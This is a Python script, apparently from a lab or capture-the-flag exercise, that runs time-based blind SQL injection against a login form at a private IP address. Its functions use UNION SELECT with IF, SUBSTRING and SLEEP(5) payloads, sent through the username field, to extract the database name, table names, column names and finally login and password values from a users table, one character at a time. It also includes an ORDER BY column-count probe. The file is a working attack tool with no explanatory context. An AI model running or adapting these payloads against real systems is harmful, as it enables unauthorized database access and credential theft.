import requests
import time
import string

def req(query):
    url = "http://10.10.0.43/"
    data = { "username":query, "password":"" }
    request = requests.post(url, data=data)

    return request.text

def fuzzDB():
    printables = string.printable
    name_db = ""

    while True:

        for char in printables:
            guess_db = name_db + char
            query = "' union select 1,2,if(substring((select database()),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            print(guess_db)
            before = time.time()
            req(query)
            after = time.time()
            total = after - before
            if (int(total) >= 5):
                name_db = guess_db
                break

def fuzzTable():
    printables = string.printable
    name_db = ""

    while True:

        for char in printables:
            guess_db = name_db + char
            # query = "' union select 1,2,if(substring((select table_name from information_schema.tables where table_schema = 'cc' limit 0,1),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            query = "' union select 1,2,if(substring((select table_name from information_schema.tables where table_schema = 'cc' limit 1,1),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            print(guess_db)
            before = time.time()
            req(query)
            after = time.time()
            total = after - before
            if (int(total) >= 5):
                name_db = guess_db
                break

def fuzzColumn():
    printables = string.printable
    name_db = ""

    while True:

        for char in printables:
            guess_db = name_db + char
            # query = "' union select 1,2,if(substring((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'cc' limit 0,1),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            # query = "' union select 1,2,if(substring((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'cc' limit 1,1),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            query = "' union select 1,2,if(substring((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'cc' limit 2,1),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            print(guess_db)
            before = time.time()
            req(query)
            after = time.time()
            total = after - before
            if (int(total) >= 5):
                name_db = guess_db
                break

def fuzzRow():
    printables = string.printable
    name_db = ""

    while True:

        for char in printables:
            guess_db = name_db + char
            # query = "' union select 1,2,if(substring((select login from users limit 0),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            # query = "' union select 1,2,if(substring((select password from users limit 1),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            # query = "' union select 1,2,if(substring((select login from users limit 1,1),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            query = "' union select 1,2,if(substring((select password from users limit 1,1),1, " + str(len(guess_db)) + ")='" + guess_db + "', sleep(5), NULL) -- -"
            print(guess_db)
            before = time.time()
            req(query)
            after = time.time()
            total = after - before
            if (int(total) >= 5):
                name_db = guess_db
                break

def orderBy():
    numbers = list({1,2,3,4,5,6,7,8,9})
    for num in numbers:
        query = "' or 1=1 order by " + str(num) + " -- -"
        print(num)
        if not ("Username or password is invalid!" in req(query)):
            print("Union correct: " + str(num))

fuzzRow()
